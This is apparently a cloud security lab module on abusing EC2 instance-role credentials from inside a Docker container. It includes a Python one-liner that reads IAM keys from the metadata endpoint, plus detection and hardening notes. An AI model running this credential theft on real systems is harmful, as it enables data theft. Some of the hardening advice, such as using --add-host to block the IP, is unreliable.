# Module 5 - Container Task Role Abuse

## Attack chain
Code execution inside container - EC2 IMDS accessible from container network - stolen IAM role credentials - S3 data exfiltration

## The vulnerability
Docker containers share the EC2 host network stack by default.
This means the EC2 IMDS endpoint (169.254.169.254) is reachable from inside any container
running on the host without any special privileges or container escape.

The EC2 instance has an IAM role attached with S3 read permissions.
Any code running inside a container on that instance can steal those credentials.

## Exploitation
From inside the container (simulating RCE in a containerized application):

```bash
python3 -c "
import urllib.request
url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/container-lab-task-role'
response = urllib.request.urlopen(url, timeout=5)
print(response.read().decode())
"
```

Returns AccessKeyId, SecretAccessKey, and Token for the EC2 task role.
Credentials then used from attacker machine to access S3.

## Impact
IAM role credentials stolen from inside a container without:
- Escaping the container
- Root/privileged access
- Any vulnerability in AWS itself
Just standard network access to a link-local address.

## Detection - CloudTrail indicators
- AssumeRole event when EC2 instance assumed the role
- GetCallerIdentity called by assumed-role session from external IP
  (role credentials used outside AWS = stolen credentials being tested)
- sourceIPAddress mismatch: role belongs to EC2 instance IP, used from attacker IP

## Hardening
- Enable IMDSv2 on the EC2 host (http_tokens = required)
  IMDSv2 requires a PUT request for a token before GET most container
  applications cannot complete this two-step flow
- Use Docker's --add-host flag to block IMDS: --add-host 169.254.169.254:127.0.0.1
- Scope IAM role permissions to minimum required limit blast radius if stolen
- Consider blocking IMDS access at the container level using iptables rules on the host
